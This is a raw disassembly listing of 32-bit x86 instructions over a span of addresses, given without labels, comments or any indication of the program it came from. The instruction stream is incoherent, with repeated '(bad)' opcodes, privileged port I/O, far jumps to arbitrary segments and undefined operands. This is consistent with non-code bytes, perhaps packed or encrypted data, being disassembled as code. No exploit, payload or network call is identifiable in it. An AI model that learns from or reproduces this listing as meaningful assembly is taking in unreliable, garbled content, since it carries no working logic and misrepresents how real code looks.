  4197bd:	push   esp
  4197be:	loop   0x4197a2
  4197c0:	popa   
  4197c1:	enter  0xfa99,0x96
  4197c5:	clc    
  4197c6:	imul   edi,DWORD PTR gs:[ebx],0x3febb2d2
  4197cd:	cdq    
  4197ce:	add    BYTE PTR [eax],dl
  4197d0:	jmp    FWORD PTR [eax-0x10]
  4197d3:	add    dh,BYTE PTR [edi]
  4197d5:	jne    0x4197c2
  4197d7:	pop    es
  4197d8:	pop    ss
  4197d9:	and    cl,al
  4197db:	iret   
  4197dc:	and    al,0x9c
  4197de:	jns    0x419824
  4197e0:	push   ss
  4197e1:	int    0x54
  4197e3:	pop    eax
  4197e4:	dec    edx
  4197e5:	adc    DWORD PTR [ecx-0x6],ebp
  4197e8:	ret    
  4197e9:	pushf  
  4197ea:	scas   eax,DWORD PTR es:[edi]
  4197eb:	loop   0x419823
  4197ed:	mul    ebx
  4197ef:	(bad)
  4197f3:	xchg   edx,eax
  4197f4:	inc    esi
  4197f5:	or     eax,0xe1a9ddf5
  4197fa:	pop    esp
  4197fb:	in     eax,dx
  4197fc:	xchg   ebp,eax
  4197fd:	dec    esi
  4197fe:	les    eax,FWORD PTR [ebx+0x4936290]
  419804:	xor    bh,bh
  419806:	not    BYTE PTR [ebx-0x145b7b2e]
  41980c:	hlt    
  41980d:	pop    edi
  41980e:	mov    eax,ds:0x761da191
  419813:	mov    dl,0x8e
  419815:	push   ds
  419816:	cmp    ebp,DWORD PTR [ebx-0x59]
  419819:	scas   al,BYTE PTR es:[edi]
  41981a:	ffree  st(7)
  41981c:	jg     0x419815
  41981e:	cwde   
  41981f:	push   es
  419820:	mov    cl,0xdc
  419822:	es pop ebp
  419824:	dec    eax
  419825:	ins    DWORD PTR es:[edi],dx
  419826:	icebp  
  419827:	fisttp QWORD PTR [ebp-0x2c9030fc]
  41982d:	into   
  41982e:	pusha  
  41982f:	xchg   esi,eax
  419830:	push   es
  419831:	fmul   DWORD PTR [ecx]
  419833:	inc    edx
  419834:	sub    BYTE PTR [esp+eiz*2],bh
  419837:	mov    ecx,0x4192a2eb
  41983c:	int    0x12
  41983e:	sbb    al,0xfc
  419840:	jmp    0xddac:0x71a15c8a
  419847:	scas   eax,DWORD PTR es:[edi]
  419848:	sub    DWORD PTR [eax],ecx
  41984a:	mov    esp,0x327fedc
  41984f:	and    al,0x21
  419851:	sbb    cl,BYTE PTR [ecx+ebp*8-0x1d]
  419855:	sub    al,0xc9
  419857:	push   esp
  419858:	les    edi,FWORD PTR [edx-0x75011816]
  41985e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41985f:	les    ebp,FWORD PTR [edi]
  419861:	jbe    0x4198af
  419863:	fild   DWORD PTR [eax-0x6b]
  419866:	ss loopne 0x41982a
  419869:	test   DWORD PTR [ebp-0x7f],0x4526dcbf
  419870:	call   0xa1d8:0x52adfed7
  419877:	pop    esi
  419878:	sub    eax,0x78de46f8
  41987d:	sub    al,0xd3
  41987f:	retf   0x458
  419882:	fsub   QWORD PTR [ecx+0x33d04940]
  419888:	or     esi,DWORD PTR [edx-0x44e69170]
  41988e:	in     al,0xd8
  419890:	cld    
  419891:	dec    edi
  419892:	jmp    0xc3dd:0x60121eda
  419899:	mov    edi,0xbb5776f9
  41989e:	pop    edx
  41989f:	(bad)  
  4198a0:	enter  0xac5f,0xf5
  4198a4:	mov    ds:0xe9f553d,eax
  4198a9:	mov    eax,ds:0x3892187b
  4198ae:	and    esi,DWORD PTR [ebx-0xb57d396]
  4198b4:	xchg   edi,eax
  4198b5:	ins    DWORD PTR es:[edi],dx
  4198b6:	cmp    al,0x6f
  4198b8:	dec    edx
  4198b9:	and    DWORD PTR [edi+0x5c],edi
  4198bc:	(bad)  
  4198bd:	jbe    0x4198b2
  4198bf:	adc    cl,BYTE PTR [ecx+0x4e8e890e]
  4198c5:	pop    edx
  4198c6:	add    dh,0x86
  4198c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198ca:	cmp    eax,0x6b915cfa
  4198cf:	(bad)  
  4198d0:	out    dx,al
  4198d1:	lods   eax,DWORD PTR ds:[esi]
  4198d2:	or     dl,bh
  4198d4:	xor    bl,bh
  4198d6:	sbb    BYTE PTR [ebp-0x7d],0xdb
  4198da:	push   ebp
  4198db:	adc    dl,BYTE PTR [esi-0x35]
  4198de:	inc    esp
  4198df:	out    dx,al
  4198e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198e1:	fimul  WORD PTR [edx]
  4198e3:	mov    ch,0x78
  4198e5:	fldcw  WORD PTR [ebx+0x6d]
  4198e8:	ins    BYTE PTR es:[edi],dx
  4198e9:	add    ah,BYTE PTR [edx+0x130d7fc7]
  4198ef:	xor    esi,esp
  4198f1:	out    0x3b,eax
  4198f3:	or     DWORD PTR [ebp+0x20],ecx
  4198f6:	data16 xor al,0xd1
  4198f9:	mov    ecx,0xca3e7107
  4198fe:	mov    ecx,0x277df977
  419903:	inc    esi
  419904:	add    BYTE PTR [eax+eax*8],dl
  419907:	inc    edi
  419908:	mov    ah,0x6b
  41990a:	sub    BYTE PTR [edi],0x6f
  41990d:	enter  0x33ab,0xf7
  419911:	out    0xcf,al
  419913:	mov    WORD PTR [esp+eax*1],?
  419916:	add    edx,ebp
  419918:	leave  
  419919:	das    
  41991a:	dec    edi
  41991b:	leave  
  41991c:	sub    dh,BYTE PTR [ebx+ebx*2+0x18a1e946]
  419923:	ret    
  419924:	sub    DWORD PTR [eax+0x5a],esi
  419927:	stos   DWORD PTR es:[edi],eax
  419928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419929:	mov    ebp,0xadc9c0b5
  41992e:	jno    0x41995a
  419930:	test   ah,ah
  419932:	mov    ah,bh
  419934:	xchg   esp,eax
  419935:	out    0x2,eax
  419937:	mov    dh,0xab
  419939:	mov    cl,0x9f
  41993b:	nop
  41993c:	fnsave [eax-0x3d]
  41993f:	mov    ebp,0x901fbbc
  419944:	jmp    DWORD PTR [edx-0x1b]
  419947:	jge    0x4199a7
  419949:	jne    0x41994e
  41994b:	in     al,dx
  41994c:	mov    DWORD PTR [ecx-0x55e23ddd],ebp
  419952:	mov    al,ds:0x5b9d606
  419957:	into   
  419958:	push   ds
  419959:	and    al,0x88
  41995b:	mov    esp,0x36b2b066
  419960:	sub    esp,esp
  419962:	pusha  
  419963:	daa    
  419964:	imul   ecx,DWORD PTR [esi+esi*1],0x10
  419968:	imul   BYTE PTR [eax+0x7b]
  41996b:	inc    edi
  41996c:	fdivr  QWORD PTR [ebp-0x27]
  41996f:	jne    0x4199e5
  419971:	dec    edx
  419972:	leave  
  419973:	lods   eax,DWORD PTR ds:[esi]
  419974:	aaa    
  419975:	test   al,0x2b
  419977:	jge    0x4199e1
  419979:	and    eax,0xd3160578
  41997e:	icebp  
  41997f:	enter  0x3750,0x23
  419983:	nop
  419984:	imul   edx,DWORD PTR [ebx+0x24f79bc6],0x1831f443
  41998e:	or     al,BYTE PTR [ecx+esi*8-0x51]
  419992:	mov    al,ds:0x910c7dba
  419997:	bnd jg 0x419972
  41999a:	cmp    al,0xf0
  41999c:	xchg   bh,al
  41999e:	leave  
  41999f:	jae    0x4199dc
  4199a1:	sahf   
  4199a2:	pop    ds
  4199a3:	in     eax,0x19
  4199a5:	xchg   BYTE PTR [ebx*8-0x2ffc865f],ah
  4199ac:	(bad)  
  4199ad:	in     eax,dx
  4199ae:	dec    ebp
  4199af:	xchg   esp,eax
  4199b0:	pop    DWORD PTR [eax+0x2c72e723]
  4199b6:	mov    ds:0x3ead811c,al
  4199bb:	push   esp
  4199bc:	add    al,0x99
  4199be:	jbe    0x419977
  4199c0:	xchg   esp,eax
  4199c1:	loopne 0x4199c5
  4199c3:	xchg   BYTE PTR [eax-0x80],dh
  4199c6:	ins    DWORD PTR es:[edi],dx
  4199c7:	xchg   edx,eax
  4199c8:	mov    ah,0xa1
  4199ca:	cmp    ebp,DWORD PTR [ebp-0x38]
  4199cd:	inc    esi
  4199ce:	ss jg  0x419a2f
  4199d1:	mov    cl,0xfb
  4199d3:	push   ebx
  4199d4:	repz loopne 0x419958
  4199d7:	push   ebx
  4199d8:	and    al,0x88
  4199da:	call   0xa7ed:0x501bbbca
  4199e1:	aas    
  4199e2:	or     BYTE PTR [ecx+0x3],al
  4199e5:	add    eax,0xb4f25588
  4199ea:	fcomp  st(2)
  4199ec:	xchg   edi,eax
  4199ed:	xchg   edi,eax
  4199ee:	cs stc 
  4199f0:	jne    0x4199ec
  4199f2:	ja     0x419a5c
  4199f4:	add    al,0x70
  4199f6:	jp     0x419a69
  4199f8:	mov    esp,0x75de7f83
  4199fd:	and    ecx,eax
  4199ff:	xor    BYTE PTR [edi+0x35e49310],dl
  419a05:	test   DWORD PTR [ebx-0x1879ffb],ecx
  419a0b:	ins    DWORD PTR es:[edi],dx
  419a0c:	pop    ds
  419a0d:	jae    0x419a0b
  419a0f:	je     0x4199ab
  419a11:	fwait
  419a12:	push   0x5a
  419a14:	out    0xb5,eax
  419a16:	jne    0x419a15
  419a18:	lds    ecx,FWORD PTR [ecx]
  419a1a:	jmp    0x7170d759
  419a1f:	mov    esp,0xd4a98428
  419a24:	cmp    eax,0xa43146fe
  419a29:	mov    BYTE PTR [ebp+0x3c],dh
  419a2c:	(bad)  
  419a2d:	xchg   ecx,eax
  419a2e:	push   cs
  419a2f:	test   DWORD PTR [esi],edx
  419a31:	and    DWORD PTR [eax],0x9bfac3bc
  419a37:	setbe  ah
  419a3a:	and    al,0xf
  419a3c:	jg     0x4199f1
  419a3e:	ins    DWORD PTR es:[edi],dx
  419a3f:	dec    ebx
  419a40:	push   ebp
  419a41:	scas   eax,DWORD PTR es:[edi]
  419a42:	push   cs
  419a43:	ret    0xcca1
  419a46:	or     DWORD PTR [esi+0x2f],eax
  419a49:	scas   al,BYTE PTR es:[edi]
  419a4a:	popa   
  419a4b:	inc    edi
  419a4c:	push   ss
  419a4d:	xor    esi,DWORD PTR [edi-0x6fc039c2]
  419a53:	inc    esp
  419a54:	loopne 0x419a96
  419a56:	mov    ebp,ebx
  419a58:	fwait
  419a59:	dec    ecx
  419a5a:	pop    es
  419a5b:	add    BYTE PTR [ecx],bl
  419a5d:	pop    ss
  419a5e:	mov    ebp,0x4782d7c4
  419a63:	dec    eax
  419a64:	repz push ebp
  419a66:	push   ds
  419a67:	push   edi
  419a68:	push   edx
  419a69:	jno    0x419a3b
  419a6b:	(bad)  
  419a6c:	sbb    ebx,edi
  419a6e:	jl     0x419a74
  419a70:	sub    al,0x8f
  419a72:	rol    BYTE PTR [esi+0x449cd70e],0x38
  419a79:	adc    bl,BYTE PTR [esi-0x6f]
  419a7c:	pop    ebx
  419a7d:	mov    esi,0x4771e3a0
  419a82:	cmp    esp,DWORD PTR [esi-0x5b]
  419a85:	rol    eax,0x7a
  419a88:	xchg   esi,eax
  419a89:	xor    eax,0xc5284e3d
  419a8e:	mov    ch,0x28
  419a90:	push   ds
  419a91:	mov    edi,0xd8c1b827
  419a96:	js     0x419ad2
  419a98:	out    dx,eax
  419a99:	xor    eax,0x4809b073
  419a9e:	enter  0x3fb,0xf6
  419aa2:	and    al,0xc7
  419aa4:	and    ecx,ebp
  419aa6:	mov    ah,0x2a
  419aa8:	ins    BYTE PTR es:[edi],dx
  419aa9:	addr16 inc edx
  419aab:	adc    ch,ch
  419aad:	outs   dx,DWORD PTR ds:[esi]
  419aae:	hlt    
  419aaf:	hlt    
  419ab0:	stos   BYTE PTR es:[edi],al
  419ab1:	(bad)  
  419ab2:	cmp    edi,ebx
  419ab4:	fidivr DWORD PTR [ebp-0x4c]
  419ab7:	or     dl,BYTE PTR [edx]
  419ab9:	add    al,0x41
  419abb:	sub    al,0xed
  419abd:	fwait
  419abe:	outs   dx,BYTE PTR ds:[esi]
  419abf:	mov    esi,DWORD PTR gs:[ecx]
  419ac2:	inc    esi
  419ac3:	add    ah,dh
  419ac5:	xor    BYTE PTR [ecx-0x5539efc3],ah
  419acb:	retf   
  419acc:	repz sub BYTE PTR [ebx+eax*4+0x3c],ch
  419ad1:	das    
  419ad2:	icebp  
  419ad3:	xor    cl,BYTE PTR [edi]
  419ad5:	aas    
  419ad6:	or     DWORD PTR ds:0x348ebaa7,eax
  419adc:	sub    eax,0x726756ce
  419ae1:	jg     0x419b2b
  419ae3:	mov    bl,ah
  419ae5:	ds xor eax,0xf337a63
  419aeb:	xchg   edx,eax
  419aec:	sbb    esp,ebx
  419aee:	rol    BYTE PTR [eax],cl
  419af0:	lahf   
  419af1:	adc    cl,BYTE PTR [ebp+0x33]
  419af4:	cli    
  419af5:	out    dx,eax
  419af6:	xor    DWORD PTR [edi],ebx
  419af8:	mov    ch,0x9f
  419afa:	push   esp
  419afb:	mov    edx,0xf5afe895
  419b00:	jp     0x419b03
  419b02:	es mov eax,0x756806b1
  419b08:	pop    ss
  419b09:	push   eax
  419b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b0b:	push   eax
  419b0c:	rcr    BYTE PTR [eax+eax*8+0x5803fcd0],0xd7
  419b14:	inc    edx
  419b15:	add    DWORD PTR [edx*1+0x7aec5aab],ecx
  419b1c:	rcr    dh,cl
  419b1e:	pusha  
  419b1f:	mov    ebp,0x490357b1
  419b24:	dec    esp
  419b25:	pop    es
  419b26:	dec    edx
  419b27:	mov    dh,0xdf
  419b29:	dec    ebp
  419b2a:	shr    BYTE PTR [eax+0x7dfa8574],1
  419b30:	cmp    edx,DWORD PTR [eax]
  419b32:	stos   BYTE PTR es:[edi],al
  419b33:	and    BYTE PTR [edi-0x1aef1324],al
  419b39:	sbb    al,0x18
  419b3b:	test   BYTE PTR [ecx],cl
  419b3d:	mov    al,0x88
  419b3f:	inc    ebp
  419b40:	adc    dl,BYTE PTR [esi-0x72]
  419b43:	mov    BYTE PTR [ecx],0x10
  419b46:	and    BYTE PTR [edx-0x1a],ah
  419b49:	mov    ebp,0x99eb09a
  419b4e:	jmp    0x5fce:0x4de1be7a
  419b55:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  419b57:	sub    bh,BYTE PTR [ecx+0x61503cce]
  419b5d:	test   BYTE PTR ds:0xc8f4e567,0xec
  419b64:	pop    ebp
  419b65:	test   DWORD PTR [ebx+0x12],edi
  419b68:	stos   BYTE PTR es:[edi],al
  419b69:	int    0x92
  419b6b:	aas    
  419b6c:	sub    BYTE PTR [edx-0x3c],0xde
  419b70:	sub    eax,0x7059bb06
  419b75:	push   edi
  419b76:	jns    0x419bbf
  419b78:	push   esp
  419b79:	xor    BYTE PTR [ecx+0x4d],bl
  419b7c:	xchg   esp,eax
  419b7d:	repz jl 0x419bcb
  419b80:	pop    edi
  419b81:	pop    edx
  419b82:	jecxz  0x419b15
  419b84:	push   esp
  419b85:	sbb    edx,ebx
  419b87:	mov    esi,0x716345e
  419b8c:	push   ss
  419b8d:	pushf  
  419b8e:	scas   al,BYTE PTR es:[edi]
  419b8f:	add    BYTE PTR [edi],ch
  419b91:	in     al,dx
  419b92:	mov    al,0x56
  419b94:	div    BYTE PTR [ebx-0x7ba01381]
  419b9a:	or     dh,BYTE PTR [eax]
  419b9c:	adc    BYTE PTR [esi+ebx*4+0x28],dl
  419ba0:	mov    cl,0x5e
  419ba2:	cmc    
  419ba3:	or     dh,BYTE PTR [edi+0x33]
  419ba6:	sub    al,0xae
  419ba8:	xchg   BYTE PTR [esi+0x13],al
  419bab:	or     eax,0xfb233b26
  419bb0:	lahf   
  419bb1:	dec    ecx
  419bb2:	hlt    
  419bb3:	xlat   BYTE PTR ds:[ebx]
  419bb4:	add    BYTE PTR [edx+esi*4],bl
  419bb7:	cmp    al,0xf6
  419bb9:	adc    eax,0x5a7e8123
  419bbe:	mov    dl,0x8e
  419bc0:	test   al,0xab
  419bc2:	push   esp
  419bc3:	cmp    al,dh
  419bc5:	jne    0x419bbe
  419bc7:	sub    BYTE PTR [ebp+0x63b02c7b],dh
  419bcd:	sub    dh,0x46
  419bd0:	popf   
  419bd1:	ds or  ebx,esp
  419bd4:	loopne 0x419c49
  419bd6:	enter  0x5059,0xdc
  419bda:	xor    BYTE PTR [ebx-0x5575ddfa],al
  419be0:	pusha  
  419be1:	loopne 0x419c5c
  419be3:	xor    edi,DWORD PTR [ebp-0x12bb2111]
  419be9:	push   es
  419bea:	hlt    
  419beb:	stos   DWORD PTR es:[edi],eax
  419bec:	sbb    ecx,DWORD PTR [eax+edi*1+0x63]
  419bf0:	out    0x9b,eax
  419bf2:	jge    0x419c3b
  419bf4:	push   edi
  419bf5:	fst    DWORD PTR [ebx]
  419bf7:	mov    edi,0xcd85a244
  419bfc:	(bad)  
  419bfd:	mov    ecx,0x3fa781ec
  419c02:	sbb    eax,0x80371bfb
  419c07:	test   ch,dh
  419c09:	daa    
  419c0a:	cs stc 
  419c0c:	jmp    0x419c3b
  419c0e:	ja     0x419c5e
  419c10:	icebp  
  419c11:	jg     0x419c84
  419c13:	daa    
  419c14:	dec    edi
  419c15:	out    0xbe,al
  419c17:	mov    al,0xa3
  419c19:	jo     0x419bf2
  419c1b:	mov    esi,0x32f5c3c5
  419c20:	call   0x6901a0c5
  419c25:	fldenv [eax-0x7d]
  419c28:	or     dh,al
  419c2a:	lahf   
  419c2b:	cmp    ebx,eax
  419c2d:	mov    BYTE PTR [ecx-0x60],0x65
  419c31:	mov    dl,0x57
  419c33:	push   esi
  419c34:	push   ebp
  419c35:	dec    ebx
  419c36:	cmp    dl,dl
  419c38:	dec    ecx
  419c39:	xor    esp,DWORD PTR [esi-0x58]
  419c3c:	ins    DWORD PTR es:[edi],dx
  419c3d:	ss dec ecx
  419c3f:	xchg   esp,ebx
  419c41:	jns    0x419c3e
  419c43:	push   ss
  419c44:	fs scas al,BYTE PTR es:[edi]
  419c46:	cmp    eax,0x80dd0f08
  419c4b:	pop    edi
  419c4c:	xchg   DWORD PTR [ebp-0x11df6b66],ecx
  419c52:	mov    eax,0xf6ddb103
  419c57:	sbb    al,0xc2
  419c59:	inc    edx
  419c5a:	int    0x71
  419c5c:	sbb    ch,BYTE PTR [esi-0x70]
  419c5f:	mov    ?,WORD PTR [ecx+ebp*8-0x68f16d3a]
  419c66:	xchg   edi,eax
  419c67:	fimul  DWORD PTR [eax+0x46f6ff6e]
  419c6d:	jle    0x419c2f
  419c6f:	popa   
  419c70:	retf   
  419c71:	mov    ah,0x6d
  419c73:	popa   
  419c74:	add    BYTE PTR [eax+ebp*8+0x1bbd0bf0],dh
  419c7b:	jmp    0x419ca6
  419c7d:	inc    eax
  419c7e:	in     al,dx
  419c7f:	in     al,dx
  419c80:	cmp    dl,BYTE PTR [ecx]
  419c82:	sbb    al,0xfc
  419c84:	push   0xffffffec
  419c86:	pop    esi
  419c87:	xchg   edx,eax
  419c88:	mov    dh,0xc
  419c8a:	mov    ds:0xd531e44a,al
  419c8f:	jmp    0x419c88
  419c91:	jg     0x419cb7
  419c93:	and    DWORD PTR [esi+ebp*1],edi
  419c96:	cs jbe 0x419d03
  419c99:	push   edx
  419c9a:	stc    
  419c9b:	xchg   esp,eax
  419c9c:	push   0xa5eb96a6
  419ca1:	loope  0x419c4a
  419ca3:	retf   
  419ca4:	addr16 xchg edx,eax
  419ca6:	pop    ebx
  419ca7:	test   eax,0x7b55135
  419cac:	sbb    BYTE PTR [ebx-0x2b8f6e71],0x41
  419cb3:	jns    0x419c46
  419cb5:	daa    
  419cb6:	repz xchg ebx,eax
  419cb8:	add    BYTE PTR [edi-0x95512a5],0xcc
  419cbf:	dec    esi
  419cc0:	xor    al,0xbb
  419cc2:	fdiv   QWORD PTR [ecx+0x78a286b4]
  419cc8:	dec    eax
  419cc9:	push   es
  419cca:	mov    ds:0xf47b6a98,al
  419ccf:	test   dl,dh
  419cd1:	out    dx,eax
  419cd2:	dec    edx
  419cd3:	cs sub eax,0xb2a8a5a8
  419cd9:	test   ebp,ebp
  419cdb:	idiv   DWORD PTR ds:0x4d81cbea
  419ce1:	pop    edx
  419ce2:	mov    bl,0x5a
  419ce4:	and    dh,BYTE PTR [esi+0x36560ba0]
  419cea:	jecxz  0x419cef
  419cec:	mov    ecx,0xd600b27c
  419cf1:	cmp    esi,0x57
  419cf4:	ins    DWORD PTR es:[edi],dx
  419cf5:	sbb    eax,0x7736925
  419cfa:	push   edx
  419cfb:	ds add eax,0x8669fea
  419d01:	mov    BYTE PTR [eax+0x12bd627b],ch
  419d07:	push   ebx
  419d08:	ins    BYTE PTR es:[edi],dx
  419d09:	enter  0xa715,0xe
  419d0d:	and    eax,0xfcec3c6b
  419d12:	ja     0x419cca
  419d14:	iret   
  419d15:	add    DWORD PTR [eax+ebp*4+0x402097d9],0xfd8a07cf
  419d20:	cli    
  419d21:	mov    ebx,0x932e5871
  419d26:	fisttp QWORD PTR [ebp-0x40f30fb7]
  419d2c:	ret    0xcb66
  419d2f:	in     eax,0xc4
  419d31:	fimul  DWORD PTR [edx-0x6b]
  419d34:	mov    ebx,DWORD PTR ds:0x9dbfbd10
  419d3a:	push   edi
  419d3b:	bound  ebx,QWORD PTR [edx-0x35]
  419d3e:	aad    0x31
  419d40:	xor    ebx,DWORD PTR [edi-0x4c]
  419d43:	jae    0x419da2
  419d45:	sub    BYTE PTR [eax-0x58],ah
  419d48:	mov    eax,ds:0xadbfde3c
  419d4d:	inc    ebp
  419d4e:	(bad)  
  419d4f:	adc    dh,ah
  419d51:	bound  edi,QWORD PTR [edi+0x375ae075]
  419d57:	bound  edi,QWORD PTR [ecx-0x24]
  419d5a:	cmp    al,0x81
  419d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d5d:	fdiv   DWORD PTR [ebx]
  419d5f:	lods   al,BYTE PTR ds:[esi]
  419d60:	add    BYTE PTR [esi-0x2b33063a],dh
  419d66:	(bad)  
  419d67:	and    ebp,DWORD PTR [esi]
  419d69:	les    ecx,FWORD PTR [eax]
  419d6b:	mov    ebp,0x6c3bdb1c
  419d70:	mov    esi,0xc8b793c8
  419d75:	push   esp
  419d76:	xchg   ebx,eax
  419d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d78:	aas    
  419d79:	repnz cmp BYTE PTR [eax],cl
  419d7c:	cs cmp dh,al
  419d7f:	mov    esp,0xfa60d601
  419d84:	clc    
  419d85:	inc    esp
  419d86:	idiv   BYTE PTR [eax+0x4d40b964]
  419d8c:	mov    bh,0x9d
  419d8e:	fadd   QWORD PTR [eax-0x8fa1bca]
  419d94:	push   ds
  419d95:	push   edi
  419d96:	xor    eax,0xae68646c
  419d9b:	fisub  WORD PTR [edx]
  419d9d:	push   0xec54e29e
  419da2:	pop    es
  419da3:	in     eax,dx
  419da4:	add    ecx,DWORD PTR [ecx+0x156988ca]
  419daa:	mov    ebx,0xffb76188
  419daf:	sahf   
  419db0:	or     BYTE PTR [ebp+0x65],cl
  419db3:	imul   ebx,DWORD PTR [edi+0x6ca9b0c9],0xedcdcbfe
  419dbd:	mov    ds:0x6015689,eax
  419dc2:	lds    ecx,FWORD PTR [eax-0x13acc037]
  419dc8:	sbb    eax,0xc8529e81
  419dcd:	mov    eax,0x3a64817f
  419dd2:	fs jmp 0x3389:0x2c007b5e
  419dda:	xchg   DWORD PTR [edx],esp
  419ddc:	sub    al,0xff
  419dde:	xchg   edi,eax
  419ddf:	(bad)  
  419de0:	dec    esp
  419de1:	inc    eax
  419de2:	or     cl,BYTE PTR ds:0x4dc1cf5d
  419de8:	sbb    al,0xd8
  419dea:	ss cmp al,0x27
  419ded:	jmp    0x419d7e
  419def:	mov    ds:0xfd68c843,al
  419df4:	ror    edx,0xa2
  419df7:	xchg   BYTE PTR [edx+0x434985b7],dh
  419dfd:	shl    DWORD PTR [ebp+0x1e116b0c],1
  419e03:	arpl   WORD PTR [esi-0x40],dx
  419e06:	adc    cl,BYTE PTR [edx+edi*4]
  419e09:	aad    0x4b
  419e0b:	ret    0x48ac
  419e0e:	leave  
  419e0f:	xchg   esp,eax
  419e10:	and    al,0xa9
  419e12:	(bad)  
  419e13:	or     cx,dx
  419e16:	aas    
  419e17:	mov    ebp,0xc18740a1
  419e1c:	cmp    al,0x2c
  419e1e:	xor    eax,0x7a1efbf3
  419e23:	adc    eax,0xbdaffa91
  419e28:	(bad)  
  419e29:	cmp    al,0x91
  419e2b:	mov    eax,ds:0xe8bd6d2b
  419e30:	fnsave [ebx+0x73]
  419e33:	bound  ebp,QWORD PTR [edx]
  419e35:	cmp    eax,0x254ccf5
  419e3a:	sbb    al,0xf
  419e3c:	fild   WORD PTR [edi+0x4b]
  419e3f:	push   0x4b998e6c
  419e44:	add    edi,eax
  419e46:	inc    ebp
  419e47:	sar    BYTE PTR [ebp-0x42cee6e8],cl
  419e4d:	mov    ecx,esi
  419e4f:	test   al,0xde
  419e51:	xchg   edi,eax
  419e52:	pop    eax
  419e53:	xchg   BYTE PTR [edi-0x2e8d5924],dl
  419e59:	xchg   esp,eax
  419e5a:	mov    ebp,ebx
  419e5c:	pop    eax
  419e5d:	inc    esi
  419e5e:	push   cs
  419e5f:	push   ecx
  419e60:	scas   eax,DWORD PTR es:[edi]
  419e61:	in     al,dx
  419e62:	lahf   
  419e63:	jmp    FWORD PTR [edi+0x52]
  419e66:	mov    ch,0x3c
  419e68:	sahf   
  419e69:	cmp    al,0x3f
  419e6b:	mov    ecx,edi
  419e6d:	mul    BYTE PTR [eax]
  419e6f:	into   
  419e70:	xchg   ebx,eax
  419e71:	pop    ebx
  419e72:	pusha  
  419e73:	pop    edi
  419e74:	into   
  419e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e76:	pop    ss
  419e77:	jecxz  0x419ecd
  419e79:	fs mov bh,0x3f
  419e7c:	test   al,0xe
  419e7e:	stos   DWORD PTR es:[edi],eax
  419e7f:	mov    ds:0x4da32c95,eax
  419e84:	call   0x24c2:0xb1ef24d9
  419e8b:	mov    cl,0x2
  419e8d:	dec    esi
  419e8e:	enter  0x1738,0x94
  419e92:	out    0x1f,eax
  419e94:	or     al,0x4e
  419e96:	mov    ebx,0x9217c64a
  419e9b:	inc    ebx
  419e9c:	jbe    0x419e63
  419e9e:	jb     0x419ed0
  419ea0:	jno    0x419f05
  419ea2:	daa    
  419ea3:	jo     0x419e8b
  419ea5:	scas   al,BYTE PTR es:[edi]
  419ea6:	sub    DWORD PTR [edx],ecx
  419ea8:	mov    al,0x32
  419eaa:	mov    cl,0x5a
  419eac:	imul   esp,DWORD PTR [ecx+0x4d],0xffffffdc
  419eb0:	sub    ch,BYTE PTR [ecx]
  419eb2:	jno    0x419ea7
  419eb4:	popa   
  419eb5:	push   cs
  419eb6:	add    ah,BYTE PTR [edi]
  419eb8:	jnp    0x419e78
  419eba:	inc    ebx
  419ebb:	test   eax,0x48f4b71c
  419ec0:	hlt    
  419ec1:	test   al,0x1e
  419ec3:	inc    esp
  419ec4:	mov    edi,0x2a473211
  419ec9:	mov    ds:0x8f61d944,al
  419ece:	add    al,0x63
  419ed0:	push   esi
  419ed1:	sbb    al,ah
  419ed3:	in     eax,dx
  419ed4:	std    
  419ed5:	mov    edi,0x96018147
  419eda:	iret   
  419edb:	pop    ecx
  419edc:	into   
  419edd:	adc    eax,esi
  419edf:	mov    ebp,DWORD PTR [ecx-0x59]
  419ee2:	mov    edi,0x53df7dfc
  419ee7:	push   0x2d30ffd5
  419eec:	push   ds
  419eed:	lds    edi,FWORD PTR [ebx+0x1]
  419ef0:	gs or  eax,0x1230f1db
  419ef6:	mov    BYTE PTR [edx+ebp*1-0x704aec0d],ch
  419efd:	shr    al,0xc
  419f00:	mov    bh,0xd3
  419f02:	dec    eax
  419f03:	sbb    ebx,edx
  419f05:	pop    ebx
  419f06:	hlt    
  419f07:	nop
  419f08:	cmp    cl,bh
  419f0a:	push   ebp
  419f0b:	mov    cl,0xd8
  419f0d:	aaa    
  419f0e:	xor    eax,0xbe993d36
  419f13:	jmp    FWORD PTR [ecx]
  419f15:	jmp    FWORD PTR [ebp+0x22]
  419f18:	bound  ebp,QWORD PTR fs:[edi+0x568c62a8]
  419f1f:	scas   al,BYTE PTR es:[edi]
  419f20:	mov    ?,ebx
  419f22:	popa   
  419f23:	iret   
  419f24:	jo     0x419ef6
  419f26:	push   0xfffffffe
  419f28:	arpl   WORD PTR [edx],sp
  419f2a:	popf   
  419f2b:	mov    dh,0xab
  419f2d:	dec    esp
  419f2e:	dec    esp
  419f2f:	jge    0x419f4a
  419f31:	mov    cl,0x63
  419f33:	retf   0x20c9
  419f36:	pop    edx
  419f37:	nop
  419f38:	xor    al,0xa2
  419f3a:	sbb    DWORD PTR [esi],esp
  419f3c:	xchg   ebx,eax
  419f3d:	or     edi,DWORD PTR [esi-0x34]
  419f40:	cmp    dl,BYTE PTR [eax]
  419f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f43:	mov    ebx,0x30cd37b
  419f48:	or     DWORD PTR [esi+0x1be9bb9d],ebp
  419f4e:	jnp    0x419faa
  419f50:	aaa    
  419f51:	int    0x4c
  419f53:	dec    esp
  419f54:	scas   al,BYTE PTR es:[edi]
  419f55:	stc    
  419f56:	cmp    eax,0xa08b2907
  419f5b:	adc    DWORD PTR [esi-0x42],0x94dfe6f6
  419f62:	adc    DWORD PTR [edi],edx
  419f64:	or     al,0x43
  419f66:	adc    al,0xdb
  419f68:	cmp    ebp,0xffffffce
  419f6b:	iret   
  419f6c:	test   ch,ch
  419f6e:	mov    al,0x3a
  419f70:	dec    BYTE PTR [ebx+0x338adbc]
  419f76:	daa    
  419f77:	out    dx,al
  419f78:	jb     0x419f4f
  419f7a:	stos   DWORD PTR es:[edi],eax
  419f7b:	or     eax,0xbcf5a4b3
  419f80:	pop    ebp
